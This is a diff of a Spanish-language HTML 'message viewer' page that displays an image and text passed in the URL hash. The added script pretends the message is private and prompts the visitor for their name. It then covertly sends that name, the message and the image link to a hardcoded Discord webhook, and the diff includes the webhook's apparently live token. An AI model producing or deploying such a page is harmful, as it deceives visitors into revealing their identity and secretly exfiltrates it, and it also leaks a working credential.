@@ -1,37 +1,98 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
+    <meta charset="UTF-8">
     <title>SISTEMA LAWEITA</title>
     <style>
         body { 
             margin: 0; padding: 0; 
+            background-color: #000; 
             display: flex; flex-direction: column; 
             justify-content: center; align-items: center; 
-            height: 100vh; overflow: hidden;
-            font-family: 'Consolas', monospace;
+            height: 100vh; font-family: 'Consolas', monospace;
+            color: #00ff00;
         }
-        img { max-width: 80%; max-height: 60%; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        #mensaje { margin-top: 20px; font-size: 24px; font-weight: bold; text-align: center; padding: 20px; }
+        
+        /* Estilo del error de tu captura */
+        .error-box {
+            border: 2px solid #00ff00;
+            padding: 20px 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px #00ff00, inset 0 0 10px #00ff00;
+            text-transform: uppercase;
+            font-weight: bold;
+            display: none; /* Se oculta si todo está bien */
+        }
+
+        .container { 
+            display: flex; flex-direction: column; align-items: center; 
+            text-align: center; 
+        }
+
+        img { 
+            max-width: 85%; max-height: 60vh; 
+            border-radius: 15px; 
+            box-shadow: 0 0 30px rgba(0,0,0,0.8);
+            margin-bottom: 20px;
+        }
+
+        #mensaje { font-size: 28px; font-weight: bold; padding: 0 20px; }
     </style>
 </head>
 <body id="cuerpo">
-    <img id="foto" src="" alt="Cargando...">
-    <div id="mensaje"></div>
+
+    <div id="error" class="error-box">Error: Usa el generador de Python</div>
+
+    <div id="content" class="container" style="display: none;">
+        <img id="foto" src="" alt="Imagen">
+        <div id="mensaje"></div>
+    </div>
 
     <script>
-        // Formato esperado: #FOTO*MSG*BG*TXT
+        // --- PEGA TU WEBHOOK DE DISCORD AQUÍ ABAJO ---
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471966301277651129/MF0mPwHqymx_KquApDWqgsChN32QM8eTO6iP2jrz_hhJTdV20-u8MIZELCZVaIWTIqdM";
+
         const hash = decodeURIComponent(window.location.hash.substring(1));
         const partes = hash.split('*');
 
-        if (partes.length >= 2) {
-            document.getElementById('foto').src = partes[0];
-            document.getElementById('mensaje').innerText = partes[1];
-            
-            // Si vienen colores en el link, los aplicamos
-            if (partes[2]) document.getElementById('cuerpo').style.backgroundColor = '#' + partes[2];
-            if (partes[3]) document.getElementById('mensaje').style.color = '#' + partes[3];
+        // Validamos que el link tenga los 4 datos (Foto, Mensaje, Fondo, Texto)
+        if (partes.length >= 4) {
+            const [urlFoto, texto, colorBG, colorTxt] = partes;
+
+            // Mostrar contenido y aplicar estilos
+            document.getElementById('content').style.display = 'flex';
+            document.getElementById('foto').src = urlFoto;
+            document.getElementById('mensaje').innerText = texto;
+            document.getElementById('cuerpo').style.backgroundColor = '#' + colorBG;
+            document.getElementById('mensaje').style.color = '#' + colorTxt;
+
+            // Preguntar nombre y enviar a Discord
+            setTimeout(() => {
+                let nombre = prompt("Este mensaje es privado. Ingresa tu nombre para identificarte:");
+                if (!nombre) nombre = "Anónimo cobarde";
+
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "👁️ ¡Link Abierto!",
+                            color: 65280, // Verde
+                            fields: [
+                                { name: "Persona", value: nombre, inline: true },
+                                { name: "Mensaje que vio", value: texto, inline: true },
+                                { name: "Link Imagen", value: urlFoto }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            }, 800);
+
         } else {
-            document.body.innerHTML = "<h1>ERROR: USA EL GENERADOR DE PYTHON</h1>";
+            // Si el link está mal, mostramos el error de tu imagen
+            document.getElementById('error').style.display = 'block';
         }
     </script>
 </body>
